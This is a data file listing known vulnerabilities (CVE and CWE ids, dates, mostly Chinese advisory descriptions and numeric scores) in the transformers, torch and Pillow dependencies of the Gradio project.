gradio-app_gradio,transformers,>=4.47.0,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,>=4.47.0,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
gradio-app_gradio,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
gradio-app_gradio,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
gradio-app_gradio,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 